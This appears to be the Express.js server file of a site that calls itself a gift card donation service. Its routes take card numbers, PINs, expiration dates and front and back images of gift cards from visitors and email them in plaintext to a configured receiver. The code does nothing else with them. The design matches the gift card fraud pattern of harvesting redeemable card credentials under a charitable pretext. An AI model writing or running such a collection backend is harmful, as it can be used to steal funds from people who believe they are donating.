const express = require("express");
const cors = require("cors");
const multer = require("multer");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
const rateLimit = require("express-rate-limit");
const helmet = require("helmet");
const axios = require("axios");
const mongoose = require("mongoose");
const donationSettingsRoutes = require("./routes/donationSettings");

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(helmet());

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
});
app.use("/manual-donation", limiter);
app.use("/upload-giftcard", limiter);

// MongoDB Connection
mongoose
  .connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));

// reCAPTCHA
// async function verifyCaptcha(token) {
//   const secret = process.env.RECAPTCHA_SECRET_KEY;
//   const res = await axios.post(
//     `https://www.google.com/recaptcha/api/siteverify?secret=${secret}&response=${token}`
//   );
//   return res.data.success;
// }
// reCAPTCHA
async function verifyCaptcha(token) {
  const secret = process.env.RECAPTCHA_SECRET_KEY;

  try {
    const res = await axios.post(
      `https://www.google.com/recaptcha/api/siteverify?secret=${secret}&response=${token}`
    );

    console.log("reCAPTCHA verification response:", res.data); // 👈 debug log

    return res.data.success;
  } catch (error) {
    console.error(
      "Error verifying reCAPTCHA:",
      error.response?.data || error.message
    );
    return false;
  }
}

// Nodemailer config
// const transporter = nodemailer.createTransport({
//   service: "gmail",
//   auth: {
//     user: process.env.EMAIL_USER,
//     pass: process.env.EMAIL_PASS,
//   },
// });

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // false because we are using STARTTLS, not SSL
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Manual Donation
app.post("/manual-donation", async (req, res) => {
  const {
    name,
    email,
    cardType,
    cardNumber,
    amount,
    pin,
    expiration,
    captchaToken,
  } = req.body;

  if (!(await verifyCaptcha(captchaToken))) {
    return res.status(400).json({ error: "Captcha verification failed" });
  }

  const message = `
  Manual Gift Card Donation
  ---------------------------
  Name: ${name}
  Email: ${email}
  Card Type: ${cardType}
  Card Number: ${cardNumber}
  Amount: ${amount}
  PIN: ${pin}
  Expiration: ${expiration}
  `;

  try {
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: "New Manual Gift Card Donation",
      text: message,
    });

    res.json({ message: "Manual donation email sent successfully" });
  } catch (err) {
    console.error("Error sending manual donation email:", err);
    res.status(500).json({ error: "Failed to send manual donation email" });
  }
});

// File Upload
const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: { fileSize: 15 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowed = ["image/jpeg", "image/png"];
    allowed.includes(file.mimetype)
      ? cb(null, true)
      : cb(new Error("Invalid file type"));
  },
}).fields([
  { name: "frontImage", maxCount: 1 },
  { name: "backImage", maxCount: 1 },
]);

app.post("/upload-giftcard", (req, res) => {
  upload(req, res, async function (err) {
    if (err) return res.status(400).json({ error: err.message });

    const { name, email, captchaToken } = req.body;
    const front = req.files["frontImage"]?.[0];
    const back = req.files["backImage"]?.[0];

    if (!front || !back) {
      return res.status(400).json({ error: "Both images are required" });
    }

    if (!(await verifyCaptcha(captchaToken))) {
      return res.status(400).json({ error: "Captcha verification failed" });
    }

    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: process.env.RECEIVER_EMAIL,
        subject: "New Gift Card Image Upload",
        text: `Gift card images uploaded by ${name} (${email}). See attachments.`,
        attachments: [
          { filename: "giftcard_front.png", content: front.buffer },
          { filename: "giftcard_back.png", content: back.buffer },
        ],
      });

      res.json({ message: "Images sent successfully" });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Failed to send email with images" });
    }
  });
});

// ✅ USE ROUTES
app.use("/api", donationSettingsRoutes);

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
